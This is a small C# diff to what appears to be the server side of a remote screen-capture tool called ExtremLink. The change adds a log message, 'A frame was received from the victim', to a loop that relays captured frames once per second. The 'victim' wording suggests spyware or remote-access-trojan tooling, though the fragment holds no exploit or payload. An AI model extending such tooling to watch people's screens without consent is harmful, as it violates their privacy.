@@ -145,7 +145,9 @@ namespace ExtremLink_Server.Classes
             // & - frames handling.
             while (true)
             {
-                this.SendFrame(this.ConvertBitmapImageToRenderTargetBitmap(this.GetFrame()));
+                BitmapImage tempFrame = this.GetFrame();
+                Log.LogInstance.AddMessage("A frame was received from the victim");
+                this.SendFrame(this.ConvertBitmapImageToRenderTargetBitmap(tempFrame));
                 Thread.Sleep(1000);
             }
         }
